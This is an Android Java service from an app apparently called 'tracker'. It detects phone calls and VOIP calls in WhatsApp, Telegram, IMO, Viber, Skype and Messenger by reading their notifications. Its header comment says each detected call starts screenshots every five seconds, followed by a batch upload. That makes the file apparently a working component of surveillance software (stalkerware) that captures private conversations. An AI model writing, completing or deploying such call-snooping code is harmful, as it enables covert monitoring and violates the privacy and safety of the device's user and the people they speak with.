package com.tracker.app.services;

import android.content.Context;
import android.os.Build;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;

import java.util.Arrays;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

/**
 * Monitors all types of calls:
 * - Cellular calls via TelephonyCallback (Android 12+) or PhoneStateListener (Legacy)
 * - VOIP calls (WhatsApp, IMO, Telegram) via NotificationListenerService
 *
 * When a call is detected as active, it triggers the screenshot timer (every 5 sec).
 * When the call ends, it triggers a batch upload.
 */
public class CallMonitorService extends NotificationListenerService {

    private static final String TAG = "CallMonitor";
    public static CallMonitorService instance;
    public static CallCallback onCallStarted;
    public static CallCallback onCallEnded;

    // Package names for VOIP apps
    private static final Map<String, String> VOIP_PACKAGES = new HashMap<>();
    static {
        VOIP_PACKAGES.put("com.whatsapp", "whatsapp");
        VOIP_PACKAGES.put("com.whatsapp.w4b", "whatsapp");
        VOIP_PACKAGES.put("com.imo.android.imoim", "imo");
        VOIP_PACKAGES.put("org.telegram.messenger", "telegram");
        VOIP_PACKAGES.put("com.facebook.orca", "messenger");
        VOIP_PACKAGES.put("com.viber.voip", "viber");
        VOIP_PACKAGES.put("com.skype.raider", "skype");
    }

    private static final List<String> CALL_NOTIFICATION_KEYWORDS = Arrays.asList(
            "ongoing call", "incoming call", "outgoing call",
            "video call", "voice call", "audio call",
            "calling", "on call", "in call", "ringing"
    );

    private String activeVoipCall = null;
    private String activeVoipCallNotificationKey = null;
    private boolean activeCellularCall = false;
    private PhoneStateListener phoneStateListener;
    private Object telephonyCallback; // Keep reference to unregister on Android 12+

    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
        setupCellularCallListener();
        Log.d(TAG, "Call Monitor Service created");
    }

    @Override
    public void onListenerConnected() {
        super.onListenerConnected();
        Log.d(TAG, "Notification Listener connected");
        setupCellularCallListener();
    }

    /**
     * Check permissions and request cellular listener setup if instance exists.
     */
    public static void checkAndRegisterCellularListener(Context context) {
        if (instance != null) {
            instance.setupCellularCallListener();
        }
    }

    /**
     * Listen for standard cellular calls.
     */
    @SuppressWarnings("deprecation")
    private void setupCellularCallListener() {
        try {
            TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
            if (telephonyManager == null) return;

            // Unregister previous listener
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                if (telephonyCallback != null) {
                    telephonyManager.unregisterTelephonyCallback((android.telephony.TelephonyCallback) telephonyCallback);
                    telephonyCallback = null;
                }
            } else {
                if (phoneStateListener != null) {
                    telephonyManager.listen(phoneStateListener, PhoneStateListener.LISTEN_NONE);
                    phoneStateListener = null;
                }
            }

            if (checkSelfPermission(android.Manifest.permission.READ_PHONE_STATE) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
                Log.w(TAG, "Cannot register cellular call listener: READ_PHONE_STATE permission not granted");
                return;
            }

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                class CallStateCallback extends android.telephony.TelephonyCallback implements android.telephony.TelephonyCallback.CallStateListener {
                    @Override
                    public void onCallStateChanged(int state) {
                        handleCallState(state);
                    }
                }
                CallStateCallback callback = new CallStateCallback();
                telephonyCallback = callback;
                telephonyManager.registerTelephonyCallback(getMainExecutor(), callback);
                Log.d(TAG, "Cellular call callback registered (Android 12+)");
            } else {
                phoneStateListener = new PhoneStateListener() {
                    @Override
                    public void onCallStateChanged(int state, String phoneNumber) {
                        handleCallState(state);
                    }
                };
                telephonyManager.listen(phoneStateListener, PhoneStateListener.LISTEN_CALL_STATE);
                Log.d(TAG, "Cellular call listener registered (Legacy)");
            }
        } catch (Exception e) {
            Log.e(TAG, "Failed to setup cellular call listener", e);
        }
    }

    private void handleCallState(int state) {
        switch (state) {
            case TelephonyManager.CALL_STATE_OFFHOOK:
                if (!activeCellularCall) {
                    activeCellularCall = true;
                    Log.d(TAG, "Cellular call STARTED");
                    if (onCallStarted != null) onCallStarted.onCall("phone");
                }
                break;
            case TelephonyManager.CALL_STATE_IDLE:
                if (activeCellularCall) {
                    activeCellularCall = false;
                    Log.d(TAG, "Cellular call ENDED");
                    if (onCallEnded != null) onCallEnded.onCall("phone");
                }
                break;
            case TelephonyManager.CALL_STATE_RINGING:
                Log.d(TAG, "Phone RINGING");
                break;
        }
    }

    /**
     * Detect VOIP calls from WhatsApp, IMO, etc. by monitoring their notifications.
     */
    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        String packageName = sbn.getPackageName();
        String appSource = VOIP_PACKAGES.get(packageName);
        if (appSource == null) return;

        android.app.Notification notification = sbn.getNotification();
        android.os.Bundle extras = notification.extras;
        if (extras == null) return;

        CharSequence titleCharSeq = extras.getCharSequence(android.app.Notification.EXTRA_TITLE);
        CharSequence textCharSeq = extras.getCharSequence(android.app.Notification.EXTRA_TEXT);
        String title = titleCharSeq != null ? titleCharSeq.toString().toLowerCase() : "";
        String text = textCharSeq != null ? textCharSeq.toString().toLowerCase() : "";
        String content = title + " " + text;

        boolean isCallNotification = false;
        for (String keyword : CALL_NOTIFICATION_KEYWORDS) {
            if (content.contains(keyword)) {
                isCallNotification = true;
                break;
            }
        }

        boolean isCallCategory = "call".equals(notification.category);

        if (isCallNotification || isCallCategory) {
            if (activeVoipCall == null) {
                activeVoipCall = appSource;
                activeVoipCallNotificationKey = sbn.getKey();
                Log.d(TAG, "VOIP call STARTED from: " + appSource + " (key: " + activeVoipCallNotificationKey + ")");
                if (onCallStarted != null) onCallStarted.onCall(appSource);
            }
        }
    }

    /**
     * When a VOIP call notification is removed, the call likely ended.
     */
    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {
        if (activeVoipCallNotificationKey != null && activeVoipCallNotificationKey.equals(sbn.getKey())) {
            Log.d(TAG, "VOIP call ENDED from: " + activeVoipCall + " (key: " + activeVoipCallNotificationKey + ")");
            String source = activeVoipCall;
            activeVoipCall = null;
            activeVoipCallNotificationKey = null;
            if (onCallEnded != null) onCallEnded.onCall(source);
        }
    }

    @Override
    @SuppressWarnings("deprecation")
    public void onDestroy() {
        instance = null;
        try {
            TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
            if (telephonyManager != null) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                    if (telephonyCallback != null) {
                        telephonyManager.unregisterTelephonyCallback((android.telephony.TelephonyCallback) telephonyCallback);
                    }
                } else {
                    if (phoneStateListener != null) {
                        telephonyManager.listen(phoneStateListener, PhoneStateListener.LISTEN_NONE);
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error in onDestroy", e);
        }
        super.onDestroy();
    }

    /**
     * Callback interface for call events.
     */
    public interface CallCallback {
        void onCall(String source);
    }
}
